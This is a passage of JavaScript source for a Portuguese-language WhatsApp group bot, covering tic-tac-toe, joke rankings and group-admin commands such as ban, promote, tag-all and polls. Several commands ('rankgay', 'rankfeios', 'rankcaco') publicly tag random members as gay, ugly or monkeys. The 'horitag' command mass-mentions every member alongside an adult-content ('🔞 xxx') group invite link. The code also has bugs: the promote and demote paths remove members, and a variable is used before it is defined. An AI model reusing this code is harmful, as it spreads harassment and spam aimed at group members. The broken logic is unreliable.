} else if (args == 0 || (args != 'easy' && args != 'Easy' && args != 'EASY' && args != 'normal' && args != 'Normal' && args != 'NORMAL' && args != 'hard' && args != 'Hard' && args != 'HARD'&& args != 'impossible'&& args != 'Impossible' && args != 'IMPOSSIBLE')) {
reply(`╭◪「❗Defina a dificuldade❗ 」\n╰───────────────╮  \n╭───────────────╯\n├❏ ${prefix}ttt easy\n├❏ Dificuldades: easy, normal... \n├❏ hard e impossible....\n╰───────────────╯`)
} else if (limitrl !== undefined && cdd - (Date.now() - limitrl) > 0) {
reply('╭◪「❗ESPERE 1 HORA❗ 」\n╰───────────────╮  \n╭───────────────╯\n├❏ Opa, deixe seus amigos jogarem.\n├❏ também, tente novamente:\n├❏ Em 1 HORA.\n╰───────────────╯')
} else {
tttset.tttstatus = "on"
tttset.player = sender
tttset.playerName = pushname
tttset.mentionPlayer = mek
tttset.local = from
if (args == 'easy' || args == 'Easy' || args == 'EASY') {
tttset.tttdifficulty = "EASY"
} else if (args == 'normal' || args == 'Normal' || args == 'NORMAL') {
tttset.tttdifficulty = "NORMAL"
} else if (args == 'hard' || args == 'Hard' || args == 'HARD') {
tttset.tttdifficulty = "HARD"
} else if (args == 'impossible' || args == 'Impossible' || args == 'IMPOSSIBLE') {
tttset.tttdifficulty = "IMPOSSIBLE"
}
const randomStartIA = Math.floor(Math.random() * 3)
if (randomStartIA == 0) {
IA()
tttset.reActivate1 = "on"	
}
costum(`╭◪「❗O JOGO COMEÇOU❗ 」\n╰───────────────╮  \n╭───────────────╯\n├❏ O Jogo Começou!!!\n├❏ Modo: ${tttset.tttdifficulty}\n╰───────────────╯`, text, tescuk, crtt)
loli.sendMessage(from, `🌀1️⃣2️⃣3️⃣\n🅰️${esp.a1}${esp.a2}${esp.a3}\n🅱️${esp.b1}${esp.b2}${esp.b3}\n©️${esp.c1}${esp.c2}${esp.c3}`,text )
loli.sendMessage(from,`Caso não saiba como jogar digite: ${prefix}ttthelp`, text) 
setTimeout( () => {
tttset.waitingTime = "off"
tttset.autoEndTime = "on"
}, 3600000) //4 minutos
addLimit(sender, daily)
}
break

case 'pombinhos': //Jogos
case 'casal':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(mess.only.group)
reply(mess.wait)
membr = []
buffer = await getBuffer(`https://i.imgur.com/F2zZB4T.jpg`)
const suamae11 = groupMembers
const suamae21 = groupMembers
const teupai11 = suamae11[Math.floor(Math.random() * suamae11.length)]
const teupai21 = suamae21[Math.floor(Math.random() * suamae21.length)]
var shipted1 = ["1%", `10%`, `20%`, `40%`, `50%`, `60%`, `80%`, `90%`, `100%`, `99999%`]
const shipted = shipted1[Math.floor(Math.random() * shipted1.length)]
loli.sendMessage(from, buffer, image, {quoted: say1, thumbnail:null, caption: `*Hmmm.... Shippo os dois 💟💟*\n\n1= @${teupai11.jid.split('@')[0]}\ne esse\n2= @${teupai21.jid.split('@')[0]}\ncom uma porcentagem de: ${shipted}`})
membr.push(teupai11.jid)
membr.push(teupai21.jid)
mentions(membr, true)
break

case 'rankfeios': //Jogos
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
try{
if(!isGroup) return (mess.only.group)
d = []
teks = '🤓Rank dos mais feios \n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `🤓❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'rankcaco': //Jogos
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
try{
if(!isGroup) return reply(mess.only.group)
d = []
teks = '🐒 Rank dos camacos\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `️‍🐒❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'rankgay': //Jogos
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
try{
if(!isGroup) return reply(mess.only.group)
d = []
teks = '🏳️‍🌈 Rank dos mais gays\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `🏳️‍🌈❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'rank': //Jogos
try{
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if(!isGroup) return reply(ptbr.group())
d = []
top1 = body.slice(5)
teks = `️‍rank do mais${top1}:\n`
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `️‍❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true, {quoted: say1})
} catch (e) {
console.log(e)
reply('ocorreu um erro')
}
break

/* ===================================================[ ${NomeDoMenu} ]==============================================================*/    



/*===================================================[ ${NomeDoMenu} ]==============================================================*/    

case 'grupo':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroupAdmins && !isOwner) return reply(ptbr.admin())
if (!isGroup) return reply(ptbr.AdmDoBot())
const chatts3 = `${totalchat.length}`
const grupo1 = fs.readFileSync('./src/grupo.mp4')
loli.sendMessage(from, grupo1,  MessageType.video, {mimetype: 'video/gif', quoted: say1, caption: `

╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│Olá @${sender.split('@')[0]}!!
┃⋆├───────────────────
┃⋆│⬩ 𝗂𝗇𝖿𝗈𝗋𝗆𝖺𝖼̧𝗈̃𝖾𝗌 𝖽𝗈 𝖻𝗈𝗍
┃⋆│⪧ Nome ${pushname} ⟨💎⟩
┃⋆│⪧ prefix: ⟨ ${prefix} ⟩ ⟨❗⟩            
┃⋆│⪧ Bateria: ${bateria} ⟨🔋⟩               
┃⋆│⪧ Horário: ${hr} ⟨⏰⟩                       
┃⋆│⪧ Chats ${chatts3} ⟨🏓⟩
┃⋆╰───────────────────
╰━════════════════════⊷
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ 𝙼𝚎𝚗𝚞 𝚍𝚎 𝚐𝚛𝚞p𝚘
┃⋆│💎➢ ${prefix}Ban @Pessoa ⟨🔥⟩
┃⋆│➥ Banir marcando a pessoa @<=
┃⋆│💎➢ ${prefix}Banir ⟨🔥⟩
┃⋆│➥ Marque a mensagem da pessoa
┃⋆│💎➢ ${prefix}Add 55xxxx ⟨🌸⟩ [OFF]
┃⋆│➥ Adiciona a pessoa no grupo
┃⋆│💎➢ ${prefix}Add2 ⟨🌸⟩ [OFF]
┃⋆│➥ Marque a mensagem da pessoa
┃⋆│💎➢ ${prefix}Promover @Pessoa ⟨🌀⟩
┃⋆│➥ Promover marcando a pessoa
┃⋆│💎➢ ${prefix}Promote ⟨🌀⟩
┃⋆│➥ Marque a mensagem da pessoa
┃⋆│💎➢ ${prefix}Rebaixar @Pessoa ⟨☔⟩
┃⋆│➥ Rebaixar marcando a pessoa
┃⋆│💎➢ ${prefix}Demote ⟨☔⟩
┃⋆│➥ Marque a mensagem da pessoa
┃⋆│💎➢ ${prefix}Abrir ⟨👾⟩
┃⋆│➥ Abrir grupo 
┃⋆│💎➢ ${prefix}Fechar ⟨👾⟩
┃⋆│➥ Fechar o grupo
┃⋆│💎➢ ${prefix}Gp ⟨🍑⟩
┃⋆│➥ Botão, abrir e fechar grupo
┃⋆│💎➢ ${prefix}Votação ⟨🏓⟩
┃⋆│➥ Fazer uma votação
┃⋆│💎➢ ${prefix}Setname ⟨📄⟩
┃⋆│➥ Alterar nome do grupo
┃⋆│💎➢ ${prefix}Setdesk ⟨📄⟩
┃⋆│➥ Altera a descrição do grupo
┃⋆│💎➢ ${prefix}Setppgc ⟨📄⟩
┃⋆│➥ Altera imagem do grupo
┃⋆│💎➢ ${prefix}Marcar ⟨👥⟩
┃⋆│➥ Marca todos os membros
┃⋆│💎➢ ${prefix}Grupo-info ⟨😬⟩
┃⋆│➥ Informações do grupo
┃⋆│💎➢ ${prefix}Lista-adm ⟨🐒⟩
┃⋆│➥ Listar todos os administradores
┃⋆│💎➢ ${prefix}Link-gp ⟨📑⟩
┃⋆│➥ Link do grupo
┃⋆│💎➢ ${prefix}Notif ⟨🏓⟩
┃⋆│➥ Notificar todos os membros
┃⋆│💎➢ ${prefix}Supertag ⟨🌸⟩
┃⋆│➥ Notificar com áudio/video/sticke
┃⋆│💎➢ ${prefix}Del ⟨😬⟩
┃⋆│➥ Apaga mensagem do bot
┃⋆│💎➢ ${prefix}Welcome ⟨🐦⟩
┃⋆│➥ Modo bem vindo para membros
┃⋆│💎➢ ${prefix}Autoreply ⟨🔥⟩
┃⋆│➥ Autorespostas do bot
┃⋆│💎➢ ${prefix}Antilink ⟨🔥⟩
┃⋆│➥ Remover todo tipo de links
┃⋆│💎➢ ${prefix}Antidoc ⟨🌀⟩
┃⋆│➥ Anti documentos
┃⋆│💎➢ ${prefix}Antifake ⟨👻⟩
┃⋆│➥ Banir numeros +1
┃⋆│💎➢ ${prefix}Antiloc ⟨👻⟩
┃⋆│➥ Anti trava localização
┃⋆│💎➢ ${prefix}Anticatalogo ⟨👻⟩
┃⋆│➥ Anti trava catalogo
┃⋆│💎➢ ${prefix}Antictt ⟨👻⟩
┃⋆│➥ Anti trava contato
┃⋆│💎➢ ${prefix}Antitxt ⟨👻⟩
┃⋆│➥ Anti trava texto
┃⋆│💎➢ ${prefix}Autofigu ⟨💎⟩
┃⋆│➥ Fazer sticker com foto/vídeo/gif
┃⋆│💎➢ ${prefix}Leveling ⟨☔⟩
┃⋆│➥ Modo leveis 
┃⋆│💎➢ ${prefix}checkativo ⟨📄⟩
┃⋆│➥ ver atividade do membro
┃⋆│   @pessoa
┃⋆│💎➢ ${prefix}atividade ⟨📄⟩
┃⋆│➥ ver atividade do grupo
┃⋆│💎➢ ${prefix}permaban ⟨🗡️⟩
┃⋆│➥ permanente ban grupo
┃⋆│💎➢ ${prefix}permabanadd ⟨🗡️⟩
┃⋆│➥ permanente ban grupo
┃⋆│  adicionar pessoa
┃⋆│💎➢ ${prefix}permabanrm ⟨🗡️⟩
┃⋆│   permanente ban grupo
┃⋆│   remover pessoa da lista
┃⋆│💎➢ ${prefix}permabanlist ⟨🗡️⟩
┃⋆│➥ ver lista de permaban
┃⋆╰───────────────────
╰━━════════════════════⊷`})
break

case 'ban': //grupo
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('A marca-alvo que você quer chutar!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Alvo removido com sucesso :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						loli.groupRemove(from, mentioned)
					} else {
						mentions(`Alvo removido com sucesso  : @${mentioned[0].split('@')[0]}`, mentioned, true)
						loli.groupRemove(from, mentioned)
					}
					break
case 'banir': //Grupo
case 'kick': 
case 'b': 
case 'k': 
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (exe1.groupadmins> 1) {
var M_exe = []
for (let cut of exe1) {
M_exe.push(cut)
}
loli.groupRemove(from, M_exe)
} else {
loli.groupRemove(from, [exe1[0]])
}
} else {
exe1 = mek.message.extendedTextMessage.contextInfo.participant
loli.groupRemove(from, [exe1])
const matarb= ["matar17","matar16","matar15","matar14","matar13","matar12","matar11","matar10","matar9","matar8","matar7","matar6","matar5","matar4","matar3","matar2","matar1"]
matar23 = matarb[Math.floor(Math.random() * (matarb.length))]	
const mata2 = fs.readFileSync('./src/ban/'+matar23+'.mp4')
loli.sendMessage(from, mata2,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: `Alvo foi Morto e Desintegrado por ${pushname}` })
}
break

//case 'add'://
//addFilter(from)
//if (isOwner) return reply('Motivo: Ta Bugado')
//if (!isRegistered) returnreply(ptbr.rg(prefix, pushname))
//if (!isGroupAdmins) return//reply(mess.only.admin)
//if (!isGroup) return// reply(mess.only.group)
//if (args.length < 1)return// reply('Você quer adicionar um gênio?')//
//if (args[0].startsWith('08'))return reply('Use o códigodo país, man')//
//try {
//num = `${args[0].replace(//g, '')//}@s.//whatsapp.net`//
//loli.groupAdd(from, [num])
//} catch (e) {
//console.log('Error :', e)
//reply('Falha ao adicionar destino, talvez porque é privado')
//}
//break

//case 'add2': 
//case 'reviver':
//addFilter(from)
//if (isOwner) return reply('Motivo: Ta Bugado')
//if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
//if (!isGroup) return reply(mess.only.group)//
//if (!isGroupAdmins) return reply(mess.only.admin)
//if (!isBotGroupAdmins) return// reply(mess.only.Badmin)//
//if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;//
//if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {//
//entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
//if (exe1.groupadmins> 1) {
//var M_exe = []
//for (let cut of exe1) {//
//M_exe.push(cut)
//}
//loli.groupAdd(from, M_exe)
//} else {
//loli.groupAdd(from, [exe1[0]])
//}
//} else {
//exe1 = mek.message.extendedTextMessage.contextInfo.participant
//loli.groupAdd(from, [exe1])
//}
//break

case 'promover': //Grupo
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'carinha promovido caralho\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(from, mentioned, true)
loli.groupRemove(from, mentioned)
} else {
mentions(`Ok, chefe. esse cara aqui: @${mentioned[0].split('@')[0]} agora é admin do grupo!`, mentioned, true)
loli.groupMakeAdmin(from, mentioned)
}
break

case 'promote': //Grupo
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (exe1.groupadmins> 1) {
var M_exe = []
for (let cut of exe1) {
M_exe.push(cut)
}
loli.groupMakeAdmin(from, M_exe)
} else {
loli.groupMakeAdmin(from, [exe1[0]])
}
} else {
exe1 = mek.message.extendedTextMessage.contextInfo.participant
loli.groupMakeAdmin(from, [exe1])
}
reply("ok, chefe esse cara agora e admin!")
break

case 'rebaixar': //Grupo
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Berhasil Demote\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
loli.groupRemove(from, mentioned)
} else {
mentions(`Ok, chefe. esse cara aqui: @${mentioned[0].split('@')[0]} perdeu o adm com sucesso!`, mentioned, true)
loli.groupDemoteAdmin(from, mentioned)
}
break

case 'demote': //Grupo
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (exe1.groupadmins> 1) {
var M_exe = []
for (let cut of exe1) {
M_exe.push(cut)
}
loli.groupDemoteAdmin(from, M_exe)
} else {
loli.groupDemoteAdmin(from, [exe1[0]])
}
} else {
exe1 = mek.message.extendedTextMessage.contextInfo.participant
loli.groupDemoteAdmin(from, [exe1])
}
reply("ok, chefe esse cara perdeu o adm!")
break

case 'abrir-grupo': //Grupo
case 'abrir-gp':
case 'abrirg':
case 'abrir':
case 'abrir-gc':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (!isBotGroupAdmins) return reply(ptbr.Badmin())
open = {
text: `Grupo aberto pelo administrador ${pushname}\n *Ohayou Gozaimasu, Linda manhã para todos membros*`,
  contextInfo: {
mentionedJid: [sender]
  }
}
loli.groupSettingChange (from, GroupSettingChange.messageSend, false)
loli.sendMessage(from, open, text, {
  quoted: say1
})
break

case 'fecharg': //Grupo
case 'fechar':
case 'fechagrupo':
case 'fechar-gp':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (!isBotGroupAdmins) return reply(ptbr.Badmin())
var nomor = mek.participant
const close = {
text: `Grupo fechado pelo administrador ${pushname}\n *Konnichiwa,Grupo abre na parte da manhã seus lindos*`,
contextInfo: {
mentionedJid: [nomor]
}
}
loli.groupSettingChange (from, GroupSettingChange.messageSend, true);
loli.sendMessage(from, close, text, {
  quoted: say1
})
break

case 'gp':
  const buttons2 = [
  {buttonId: `${prefix}abrir`, buttonText: {displayText: 'Ξ Abrir Grupo'}, type: 1},
  {buttonId: `${prefix}fechar`, buttonText: {displayText: 'Ξ Fechar Grupo'}, type: 1},
  ]
wew = fs.readFileSync('./src/logogp.jpeg')
  mhan = await loli.prepareMessage(from, wew, image, {thumbnail: null})
const button2Message = {
     imageMessage: mhan.message.imageMessage,
    contentText: `clique no botão para fazer a ação desejada, APENAS ADM`,
    footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
    buttons: buttons2,
    headerType: 4
}
loli.sendMessage(from, button2Message, MessageType.buttonsMessage, {quoted: say4})
break

case 'votacao': case 'votação':
if (!isGroupAdmins)return reply('Apenas admins podem começar ou parar uma votação')
if (args.length < 1)return reply(`Exemplo: ${prefix}${command} devo comprar Minecraft?`)
if (args[0] === 'off') {
if (!isVotacao)return reply('Nao ha votações nesse grupo a serem apagadas')
reply('desativando votação')
let position = false
Object.keys(votacao).forEach((i) => {
if (votacao[i].grupo === from) {
position = i
}
})
if (position !== false) {
reply('Votacao desativada')
votacao.splice(position, 1)
fs.writeFileSync('./arquivos_json/votacao.json', JSON.stringify(votacao))
}
let position2 = false
Object.keys(votou).forEach((i) => {
if (votou[i].grupo === from) {
position2 = i
}
})
if (position2 !== false) {
votou.splice(position2, 1)
fs.writeFileSync('./arquivos_json/votou.json', JSON.stringify(votou))
reply('Dados de votação dos usuários apagados, já e possível iniciar outra votação')
}
} else {
   
titulo_votacao = args.join(' ')
if (isVotacao())return reply('Voce ja iniciou uma votação')
reply('iniciando Votação espere.')
a = {grupo: from, sim: 0, nao: 0}
votacao.push(a)
fs.writeFileSync('./arquivos_json/votacao.json', JSON.stringify(votacao, null, '\t'))
titulo_votacao = 
reply(`Votacao iniciada por ${pushname}\nTopico:\n\n${titulo_votacao}`) 
}
break

case 'setname': //Grupo
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (!isBotGroupAdmins) return reply(ptbr.Badmin())
idgrup = `${from.split("@s.whatsapp.net")[0]}`;
loli.groupUpdateSubject(idgrup, `${body.slice(9)}`)
loli.sendMessage(from, 'nome do grupo alterado', text, {
quoted: mek
})
break

case 'setdesk': //Grupo
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (!isBotGroupAdmins) return reply(ptbr.Badmin())
loli.groupUpdateDescription(from, `${body.slice(9)}`)
loli.sendMessage(from, 'descrição do grupo alterada', text, {
quoted: mek
})
break

case 'setppgc': //Grupo
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (!isBotGroupAdmins) return reply(ptbr.Badmin())
const ftgp = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
const medipp = await loli.downloadAndSaveMediaMessage(ftgp)
await loli.updateProfilePicture (from, medipp)
reply('✅foto do grupo alterada✅')
break

case 'marcar': //Grupo
case 'tagall':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
members_id = []
todos = (args.length > 1) ? body.slice(8).trim(): ''
todos += `Total: ${groupMembers.length} membros\n`
for (let mem of groupMembers) {
todos += `║➸@${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions('╭╾╼◐⚋ ༒ᴍᴇɴᴄɪᴏɴᴀʀ ᴛᴏᴅᴏs ༒⚋◑╾╼╮\n║➸'+todos+'╰╾╼◐⚋ ༒ᴍᴇɴᴄɪᴏɴᴀʀ ᴛᴏᴅᴏs ༒⚋◑╾╼╯', members_id, true)
break
              case 'marcar2':
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `${line2} @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					reply(teks)
					break
                 case 'marcar3':
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `${line2} https://wa.me/${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					loli.sendMessage(from, teks, text, {detectLinks: false, quoted: mek})
					break
					case 'marcar4':
                loli.updatePresence(from, Presence.composing) 
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                teks = body.slice(9)
                group = await loli.groupMetadata(from);
                member = group['participants']
                jids = [];
                member.map( async adm => {
                jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
                 })
                 options = {
                 text: teks,
                contextInfo: {mentionedJid: jids},
                quoted: mek
                }
              await loli.sendMessage(from, options, text)
               break

case 'horitag':
addFilter(from)
loli.updatePresence(from, Presence.composing)
 if (!isGroup) return reply(mess.only.group)
members_id = []
todos = (args.length > 1) ? body.slice(8).trim(): ''
todos += `${q}\n\n`
for (let mem of groupMembers) {
todos += `
🔞🔞🔞🔞🔞🔞 xxx 🔞🔞🔞🔞🔞🔞🔞 xxx 🔞🔞🔞🔞🔞🔞🔞
https://chat.whatsapp.com/FRzbrY9HK543YfoJIIJHBg

ENTRA AI @${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(' '+todos+' ', members_id, true)
break


case 'grupo-info': //Grupo
loli.updatePresence(from, Presence.composing)
if (!isGroup) return reply(mess.only.group)
ppUrl = await loli.getProfilePicture(from) // deixe vazio para obter o seu
buffer = await getBuffer(ppUrl)
loli.sendMessage(from, buffer, image, {quoted: say1, caption: `*NOME* : ${groupName}\n*MEMBRO* : ${groupMembers.length}\n*ADMIN* : ${groupAdmins.length}\n*DESCRIÇÃO* : ${groupDesc}`})
break

case 'listadmins': //Grupo
case 'listadmin':
case 'adminlist':
case 'lista-adm':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
adl = `Lista de administradores do grupo: ${groupMetadata.subject}\nTotal: ${groupAdmins.length}\n\n`
no = 0
for (let admon of groupAdmins) {
no += 1
adl += `[${no.toString()}] @${admon.split('@')[0]}\n`
}
mentions(adl, groupAdmins, true)
break

case 'link-gp': //Grupo
case 'linkgc':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (!isBotGroupAdmins) return reply(ptbr.Badmin())
linkgc = await loli.groupInviteCode(from)
reply('https://chat.whatsapp.com/'+linkgc)
break

case 'notif': //Grupo
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroupAdmins) return reply(ptbr.admin())
loli.updatePresence(from, Presence.composing)
if (!isGroup) return reply(ptbr.group())
if(args.length < 1) return reply('escreva algo como aviso')
aviso  = `Aviso de: @${sender.split("@")[0]}\n\nAviso: ${body.slice(7)}`
group = await loli.groupMetadata(from);
member = group['participants']
jids = [];
member.map(async adm => {
jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
text: aviso,
contextInfo: {
mentionedJid: jids
},
quoted: mek
}
await loli.sendMessage(from, options, text)
break

case 'supertag': //Grupo
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await loli.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await loli.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: say1
}
ini_buffer = fs.readFileSync(file)
loli.sendMessage(from, ini_buffer, sticker, options)
fs.unlinkSync(file)
} else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await loli.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await loli.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: say1
}
ini_buffer = fs.readFileSync(file)
loli.sendMessage(from, ini_buffer, image, options)
fs.unlinkSync(file)
} else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await loli.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await loli.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'audio/mp4',
ptt : true,
contextInfo: { mentionedJid: mem },
quoted: say1
}
ini_buffer = fs.readFileSync(file)
loli.sendMessage(from, ini_buffer, audio, options)
fs.unlinkSync(file)
}  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await loli.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await loli.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'video/mp4',
contextInfo: { mentionedJid: mem },
quoted: say1
}
ini_buffer = fs.readFileSync(file)
loli.sendMessage(from, ini_buffer, video, options)
fs.unlinkSync(file)
} else{
  reply(`[❗] responder imagem/adesivo/áudio/vídeo com a legenda ${prefix}supertag para marcar`)
}
break    

case 'delete': //Grupo
  case 'del':
case 'apagar':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup)return reply(ptbr.group())
if (!isGroupAdmins)return reply(ptbr.admin())
try {
loli.deleteMessage(from, {
  id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true
})
} catch {
  reply('Só é possível deletar mensagens minhas')
}
break

case 'welcome':
//addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (args.length < 1) return reply(`[❗]ativar/desativar, Exemplo ${prefix}${command} ativar`)
if (args[0] === 'ativar') {
